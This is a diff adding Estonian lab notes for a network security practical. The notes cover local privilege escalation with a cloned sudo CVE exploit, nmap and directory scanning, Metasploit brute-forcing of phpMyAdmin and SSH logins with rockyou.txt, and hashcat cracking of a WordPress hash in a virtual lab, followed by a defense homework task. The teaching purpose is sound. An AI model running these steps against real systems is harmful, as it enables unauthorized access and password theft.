@@ -1,0 +1,100 @@
+# ⚙️ PRAKTILINE TUND: Võrguturbe Rünnakute Simulatsioon
+**Autor:** ocrHeiki 
+**Aeg:** 31.10.2025
+
+## Sissejuhatus
+See praktikum tutvustab võrguturbe põhitõdesid läbi praktilise harjutuse. Me seadistame virtuaalse keskkonna, simuleerime erinevaid rünnakuid ja uurime, kuidas süsteemid võivad olla haavatavad. Töövoog järgib järjestust: masinate seadistamine, privilege escalation Ubuntu Serveris, skännimine ja uurimine Kali masinaga, ning lõpuks kodutöö kaitsmise kohta. Kõik toimub kontrollitud virtuaalses keskkonnas, et õppida turvaliselt.
+
+## Masinad :computer:
+---
+- **Ubuntu Server testmasin**: Seadistatud virtuaalselt, kasutatud ISO külgeühendamist.
+- **Ruuter koos 2 network adapteriga**: Esimene adapter INTERNET, teine meie nimeline VLAN. ISO külgeühendatud mõlemale.
+- **App masin**: Võetud Template kaustast, lisaks mujalt masinad.
+
+## :computer: Ubuntu Server: Privilege Escalation Simulatsioon
+---
+1. Paigalda GCC kompilaator:  
+   `sudo apt install gcc`
+
+2. Loo uus kasutaja ilma sudo õigusteta:  
+   `sudo adduser kala` (parool: `ka1a`)  
+   Logi välja sudo kasutajast (`exit`) ja sisse uue kasutajaga.
+
+3. Tõmba alla haavatavuse masin (simulatsioon):  
+   `git clone https://github.com/kh4sh3i/CVE-2025-32463.git`
+
+4. Uuri kaustu:  
+   `ls`  
+   Liigu kausta: `cd CVE-2025-32463` (kasuta Tab-klahvi täiendamiseks).
+
+5. Muuda skript käivitatavaks ja käivita:  
+   `chmod +x exploit.sh`  
+   Kontrolli kasutaja ID: `id`  
+   Käivita exploit: `./exploit.sh` (saad root-õigused).
+
+6. Määra root-parool (kui puudub):  
+   `passwd root` (parool: `ruutjuur`)
+
+7. Uuenda süsteem ja paigalda sudo:  
+   `apt update && apt install sudo`
+
+## :computer: Kali: Skännimine, Andmebaasi Rünnakud ja Brute Force
+---
+### Alustame NMAP-iga (võrgu skännimine)
+- Skänni võrku teenuste ja OS-idega:  
+  `sudo nmap -sV -O 192.168.1.0/24` (lisa oma võrgu ID).  
+  Näed tulemusi, sealhulgas port 22 (SSH), mis on häkkerite sihtmärk. Port knocking võib seda avada.
+
+- Ava skännis leitud IP (nt 192.168.1.69) brauseris: Näed WordPressi lehte.  
+  Kontrolli protokolle terminalis:  
+  `whatweb 192.168.1.69` (näitab veebilehe ehitust).
+
+- Paigalda ja kasuta dirsearch tööriista:  
+  `sudo apt install dirsearch -y`  
+  `dirsearch -u "192.168.1.69"` (uurib katalooge).
+
+### Metasploit: phpMyAdmin Login Brute Force
+- Ava Metasploit:  
+  `msfconsole`
+
+- Vali moodul:  
+  `use auxiliary/scanner/http/phpmyadmin_login`
+
+- Vaata valikuid:  
+  `options`
+
+- Määra sihtmärk:  
+  `set rhost 192.168.1.69`  
+  `set targeturi /phpmyadmin/index.php`
+
+- Loo kasutajate fail:  
+  `echo root >> /tmp/user.txt`  
+  `set user_file /tmp/user.txt`
+
+- Määra paroolide fail (kasuta rockyou.txt):  
+  `set pass_file /home/heiki/Documents/rockyou.txt`
+
+- Käivita (ainult omal vastutusel, kriminaalne tegevus):  
+  `run`  
+  Saad andmebaasi parooli ja WordPressi hashitud parooli.  
+  Välju: `exit`
+
+### Hashcat: Parooli Kräkkimine
+- Kräki hashitud parool:  
+  `hashcat 'hashitud_parool' /usr/share/wordlists/rockyou.txt.gz`  
+  Saad selge parooli, millega sisse logida WordPressi admin-kontosse.  
+  (White-hat häkkerina: Tee postitus nõrga parooli kohta.)
+
+### Metasploit: SSH Login Brute Force
+- Vali moodul:  
+  `use auxiliary/scanner/ssh/ssh_login`
+
+- Määra failid:  
+  `set user_file /tmp/user.txt`  
+  `set pass_file /home/heiki/Documents/rockyou.txt`
+
+- Käivita:  
+  `run`
+
+## Kodutöö 📓
+Kirjelda, kuidas neid kolme rünnakut (privilege escalation Ubuntu Serveris, NMAP-skännimine ja Metasploit-rünnakud Kali masinaga) süsteemi eest kaitsta. Tee sellest dokumentatsioon, mis sisaldab potentsiaalseid viise kaitsmiseks.
